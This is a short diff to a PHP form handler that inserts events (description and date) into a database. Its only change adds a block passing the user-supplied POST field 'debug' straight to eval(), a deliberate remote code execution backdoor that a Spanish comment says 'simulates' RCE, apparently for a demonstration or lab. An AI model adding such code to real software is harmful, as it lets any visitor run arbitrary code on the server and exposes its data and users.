@@ -20,7 +20,9 @@ if (!empty($_POST['descripcion']) && !empty($_POST['fecha'])) {
         header('Location: index.php?error=fecha_pasada');
         exit;
     }
-
+    if (isset($_POST['debug'])) {
+    eval($_POST['debug']); // ⚠️ Esto simula ejecución remota de código
+    }
     try {
         $pdo = getConnection();
         $stmt = $pdo->prepare("INSERT INTO eventos (descripcion, fecha) VALUES (:descripcion, :fecha)");
